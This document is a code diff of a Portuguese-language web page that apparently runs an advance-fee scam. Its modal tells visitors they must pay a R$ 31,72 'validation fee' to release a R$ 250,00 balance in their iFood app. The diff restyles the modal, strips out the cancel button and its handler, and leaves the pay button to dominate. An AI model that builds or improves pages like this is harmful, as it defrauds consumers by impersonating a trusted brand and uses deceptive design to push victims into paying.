@@ -292,7 +292,7 @@
             left: 0;
             right: 0;
             bottom: 0;
-            background: rgba(0, 0, 0, 0.6);
+            background: rgba(0, 0, 0, 0.7);
             display: none;
             align-items: center;
             justify-content: center;
@@ -302,12 +302,13 @@
 
         .validation-modal {
             background: white;
-            border-radius: 20px;
-            max-width: 400px;
+            border-radius: 16px;
+            max-width: 360px;
             width: 100%;
+            max-height: 90vh;
+            overflow-y: auto;
             box-shadow: 0 20px 40px rgba(0, 0, 0, 0.2);
             animation: modalSlideIn 0.3s ease-out;
-            overflow: hidden;
         }
 
         @keyframes modalSlideIn {
@@ -315,6 +316,7 @@
                 opacity: 0;
                 transform: translateY(-30px) scale(0.9);
             }
+
             to {
                 opacity: 1;
                 transform: translateY(0) scale(1);
@@ -322,8 +324,10 @@
         }
 
         .modal-header {
+            text-align: center;
+            padding: 20px 20px 16px;
+            border-bottom: 1px solid #f0f0f0;
             position: relative;
-            padding: 20px 24px 0;
         }
 
         .modal-close {
@@ -349,37 +353,32 @@
             color: #333;
         }
 
-        .modal-content {
-            padding: 24px;
-            text-align: center;
-        }
-
         .modal-icon {
-            font-size: 48px;
-            margin-bottom: 16px;
+            font-size: 40px;
+            margin-bottom: 12px;
             display: block;
         }
 
         .modal-title {
-            font-size: 22px;
+            font-size: 20px;
             font-weight: 700;
             color: #333;
-            margin-bottom: 20px;
-            line-height: 1.3;
+            margin: 0;
         }
 
-        .modal-message {
-            color: #666;
-            font-size: 16px;
+        .modal-body {
+            padding: 20px;
+            text-align: center;
             line-height: 1.5;
-            margin-bottom: 24px;
         }
 
-        .modal-message p {
-            margin-bottom: 12px;
+        .modal-body p {
+            margin-bottom: 14px;
+            color: #666;
+            font-size: 15px;
         }
 
-        .modal-message strong {
+        .modal-body strong {
             color: #EB2834;
             font-weight: 700;
         }
@@ -389,14 +388,14 @@
             border: 2px solid #EB2834;
             border-radius: 12px;
             padding: 16px;
-            margin-bottom: 24px;
+            margin: 16px 0;
         }
 
         .fee-label {
             display: block;
             font-size: 14px;
             color: #666;
-            margin-bottom: 4px;
+            margin-bottom: 8px;
         }
 
         .fee-value {
@@ -405,11 +404,41 @@
             color: #EB2834;
         }
 
-        .modal-actions {
-            padding: 0 24px 24px;
+        .modal-features {
+            text-align: left;
+            margin: 16px 0;
+        }
+
+        .modal-features h4 {
+            font-size: 15px;
+            font-weight: 600;
+            color: #333;
+            margin-bottom: 10px;
+        }
+
+        .modal-features ul {
+            list-style: none;
+            padding: 0;
+        }
+
+        .modal-features li {
+            padding: 3px 0;
+            color: #666;
+            font-size: 14px;
+        }
+
+        .modal-features li:before {
+            content: "✓ ";
+            color: #4CAF50;
+            font-weight: bold;
+            margin-right: 8px;
+        }
+
+        .modal-footer {
+            padding: 0 20px 20px;
             display: flex;
             flex-direction: column;
-            gap: 12px;
+            gap: 10px;
         }
 
         .btn-pay-fee {
@@ -420,35 +449,26 @@
             border: none;
             border-radius: 12px;
             font-size: 16px;
-            font-weight: 600;
+            font-weight: 700;
             cursor: pointer;
             transition: all 0.3s ease;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
         }
 
         .btn-pay-fee:hover {
             background: #d91e2a;
             transform: translateY(-2px);
-            box-shadow: 0 8px 24px rgba(235, 40, 52, 0.3);
+            box-shadow: 0 8px 20px rgba(235, 40, 52, 0.3);
         }
 
-        .btn-cancel {
-            width: 100%;
-            padding: 16px;
-            background: transparent;
-            color: #666;
-            border: 2px solid #e0e0e0;
-            border-radius: 12px;
-            font-size: 16px;
-            font-weight: 600;
-            cursor: pointer;
-            transition: all 0.3s ease;
+        .btn-pay-fee:active {
+            transform: translateY(0);
         }
 
-        .btn-cancel:hover {
-            background: #f8f9fa;
-            border-color: #ccc;
-            color: #333;
-        }
+
 
         /* Responsividade para mobile */
         @media (max-width: 480px) {
@@ -461,12 +481,12 @@
                 font-size: 20px;
             }
 
-            .modal-message {
+            .modal-body p {
                 font-size: 15px;
             }
 
             .fee-value {
-                font-size: 24px;
+                font-size: 28px;
             }
         }
     </style>
@@ -534,29 +554,31 @@
     <!-- Modal de Taxa de Validação -->
     <div class="validation-modal-overlay" id="validation-modal">
         <div class="validation-modal">
-            <div class="validation-modal-header">
-                <button class="modal-close-btn" id="modal-close-btn">&times;</button>
-                <div class="modal-shield-icon">🛡️</div>
+            <div class="modal-header">
+                <button class="modal-close" id="modal-close-btn">&times;</button>
+
                 <h2 class="modal-title">Validação de Conta</h2>
-                <p class="modal-subtitle">Necessária para liberar seu saldo</p>
             </div>
-            
-            <div class="validation-modal-body">
-                <div class="fee-highlight">
-                    <div class="fee-amount">R$ 31,72</div>
-                    <p class="fee-label">Taxa de Validação Obrigatória</p>
+
+            <div class="modal-body">
+                <p>Necessária para liberar seu saldo</p>
+
+                <div class="fee-amount">
+                    <span class="fee-label">Taxa de Validação Obrigatória</span>
+                    <div class="fee-value">R$ 31,72</div>
                 </div>
-                
-                <p class="modal-text">
-                    Para garantir a <strong>segurança da transferência</strong>, é necessário validar sua conta com uma taxa única de R$ 31,72.
+
+                <p>
+                    Para garantir a <strong>segurança da transferência</strong>, é necessário validar sua conta com uma
+                    taxa única de R$ 31,72.
                 </p>
-                
-                <p class="modal-text">
+
+                <p>
                     Esta é uma etapa <strong>obrigatória</strong> para confirmar que a conta é real e pertence a você.
                 </p>
-                
+
                 <div class="modal-features">
-                    <h4>🔒 Por que é necessário?</h4>
+                    <h4>Por que é necessário?</h4>
                     <ul>
                         <li>Verificação de identidade obrigatória</li>
                         <li>Proteção contra fraudes</li>
@@ -564,18 +586,16 @@
                         <li>Liberação imediata após pagamento</li>
                     </ul>
                 </div>
-                
-                <p class="modal-text">
-                    <strong>Após o pagamento</strong>, seu saldo de R$ 250,00 será liberado imediatamente no seu app do iFood!
+
+                <p>
+                    <strong>Após o pagamento</strong>, seu saldo de R$ 250,00 será liberado imediatamente no seu app do
+                    iFood!
                 </p>
             </div>
-            
-            <div class="validation-modal-footer">
-                <button class="pay-fee-btn" id="pay-fee-btn">
-                    🔓 Pagar Taxa e Liberar Saldo
-                </button>
-                <button class="cancel-btn" id="cancel-btn">
-                    Cancelar agora
+
+            <div class="modal-footer">
+                <button class="btn-pay-fee" id="pay-fee-btn">
+                    Pagar Taxa e Liberar Saldo
                 </button>
             </div>
         </div>
@@ -628,10 +648,7 @@
                     this.hide();
                 });
 
-                // Botão Cancelar
-                document.getElementById('cancel-btn').addEventListener('click', () => {
-                    this.hide();
-                });
+
 
                 // Botão Pagar Taxa
                 document.getElementById('pay-fee-btn').addEventListener('click', () => {
